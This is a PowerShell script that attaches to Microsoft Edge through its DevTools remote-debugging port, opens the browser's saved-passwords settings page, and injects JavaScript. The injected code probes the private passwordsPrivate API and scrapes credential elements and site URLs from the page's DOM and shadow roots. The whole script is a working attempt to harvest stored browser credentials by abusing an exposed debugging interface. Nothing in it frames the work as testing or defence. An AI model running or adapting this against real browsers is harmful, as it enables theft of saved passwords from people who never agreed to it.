$ErrorActionPreference = 'SilentlyContinue'

# Get first page target and navigate to edge settings passwords
$targets = (curl.exe -s http://127.0.0.1:9222/json/list | ConvertFrom-Json)
$page = $targets | Where-Object { $_.type -eq 'page' } | Select-Object -First 1
if (-not $page) { Write-Output "no page target"; exit }

$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ct = [System.Threading.CancellationToken]::None
$ws.ConnectAsync([Uri]$page.webSocketDebuggerUrl, $ct).Wait()

$buf = [byte[]]::new(10485760)
$id = 0
function Cdp {
    param([string]$Method, [hashtable]$P)
    $script:id++
    $m = @{ id = $script:id; method = $Method }
    if ($P) { $m['params'] = $P }
    $j = ConvertTo-Json -Compress -InputObject $m -Depth 5
    $b = [System.Text.Encoding]::UTF8.GetBytes($j)
    $s = [ArraySegment[byte]]::new($b)
    $ws.SendAsync($s, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
    $s2 = [ArraySegment[byte]]::new($buf)
    $r = $ws.ReceiveAsync($s2, $ct).Result
    return [System.Text.Encoding]::UTF8.GetString($buf, 0, $r.Count)
}

# Navigate to settings/passwords
Write-Output "[*] navigating to edge://settings/passwords"
$nav = Cdp "Page.navigate" @{ url = "edge://settings/passwords" }
Write-Output "nav: $($nav.Substring(0, [Math]::Min(200, $nav.Length)))"
Start-Sleep 8

# Enable Runtime
$null = Cdp "Runtime.enable" $null

# Check page content
$content = Cdp "Runtime.evaluate" @{ expression = 'document.title + " | " + document.body.innerText.substring(0, 500)'; returnByValue = $true }
$obj = $content | ConvertFrom-Json
Write-Output "page: $($obj.result.result.value)"

# Check for chrome.passwordsPrivate
$api = Cdp "Runtime.evaluate" @{ expression = 'typeof chrome !== "undefined" && chrome.passwordsPrivate ? "YES" : typeof chrome !== "undefined" ? JSON.stringify(Object.keys(chrome)) : "no chrome"' ; returnByValue = $true }
$obj2 = $api | ConvertFrom-Json
Write-Output "passwordsPrivate: $($obj2.result.result.value)"

# Try to find password list items in the DOM
$dom = Cdp "Runtime.evaluate" @{ expression = @'
(function() {
    let rows = [];
    // Search all elements including shadow DOM
    function search(root, path) {
        try {
            let children = root.querySelectorAll('*');
            for (let el of children) {
                let tag = el.tagName.toLowerCase();
                if (tag.includes('password') || tag.includes('credential')) {
                    rows.push({tag: el.tagName, id: el.id, text: el.textContent.substring(0, 100)});
                }
                if (el.shadowRoot) search(el.shadowRoot, path + '/' + el.tagName);
            }
        } catch(e) {}
    }
    search(document, '');
    // Also check for any text containing URLs
    let text = document.body ? document.body.innerText : '';
    let urls = text.match(/https?:\/\/[^\s]+/g);
    return JSON.stringify({rows: rows, urls: urls ? urls.slice(0, 20) : [], textLen: text.length});
})()
'@; returnByValue = $true }
$obj3 = $dom | ConvertFrom-Json
Write-Output "dom: $($obj3.result.result.value)"

# Also try to evaluate the passwordsPrivate API from the settings page
$apiTest = Cdp "Runtime.evaluate" @{ expression = @'
(function() {
    try {
        if (typeof chrome !== "undefined" && chrome.passwordsPrivate) {
            return "passwordsPrivate EXISTS with keys: " + Object.keys(chrome.passwordsPrivate).join(", ");
        }
        if (typeof chrome !== "undefined") {
            return "chrome exists, keys: " + Object.keys(chrome).join(", ");
        }
        return "no chrome object";
    } catch(e) {
        return "error: " + e.message;
    }
})()
'@; returnByValue = $true }
$obj4 = $apiTest | ConvertFrom-Json
Write-Output "api test: $($obj4.result.result.value)"

$ws.Dispose()
Write-Output "done"